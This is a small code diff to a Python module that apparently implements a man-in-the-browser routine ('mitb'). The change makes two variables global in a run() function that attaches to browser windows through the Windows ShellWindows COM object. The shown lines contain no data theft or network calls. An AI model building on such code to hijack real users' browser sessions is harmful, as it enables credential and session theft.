@@ -97,7 +97,9 @@ def mitb():
 
       time.sleep(0) 
 
-def run(**args):		  
+def run(**args):
+   global clsid
+   global windows
    clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
 
    windows = win32com.client.Dispatch(clsid)
